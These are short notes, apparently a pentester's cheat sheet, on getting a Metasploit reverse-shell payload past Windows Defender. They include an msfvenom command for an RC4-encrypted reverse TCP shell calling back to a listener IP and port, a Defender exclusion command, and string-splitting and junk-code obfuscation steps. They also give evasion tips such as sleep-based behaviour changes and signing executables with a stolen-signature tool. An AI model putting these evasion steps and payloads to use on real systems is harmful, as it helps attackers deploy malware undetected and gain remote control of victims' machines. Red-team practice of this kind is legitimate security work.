# Steps


Have a Windows10 VM with Defender activated with
an exclusion on an SMB share where we can easily pass files
without detection enabled.
Disable "Tamper Protection" from GUI.

Set-MpPreference -ExclusionPath "C:\path\to\SMB\Share\dir"


1. generate the payload you want with msfvenom,
   rc4 encrypted work nicely for the purpose.

    msfvenom -p windows/x64/shell/reverse_tcp_rc4 LHOST=172.28.128.1 \
    LPORT=8080 \
    EXITFUNC=thread \
    RC4PASSWORD=PutAPasswordHere \
    -f psh-net > shell45.ps1

2. Test this with AV completely disabled just to check if it works.
3. Now this payload would be detected easily. So we should modify it.
    Follow the following steps:
    1. modify all the strings "kernel32.dll" or "system.dll" 
       to be split such as "k" + "er" + "n"...
    2. Add random functions from code found online
    3. Split the payload in many small strings
       the concatenate the strings
    4. Add more random code

3. Try the malware without AV activated, to check if the payload is working
   after the modifications. If it works.
   Let's try to check if it gets detected.
   If this happens, we should follow the split methodology. And see on which files
   the AV flags.


Note that it happened that I had to remove the "system32.dll" loading as a library.


Now how to modify the payload may change based on the format of the payload,
in general we prefer to have the source and not an executable, since
modifying executables becomes much more complicated.

To understand how to modify a C payload generated by msfvenom when using "-f c > mypayload.c"
look here:
https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/


# TLDR

The standard techniques are:
- adjusting the binary (like by compiling it from scratch instead of using a precompiled version);
- adjusting the behavior (sleep a bit, make some calculations then do bad things);
- do custom stuff;

# NOTES
If we are dealing with executables, it is a good idea to sign them. We can do this:
by using:
https://github.com/secretsquirrel/SigThief
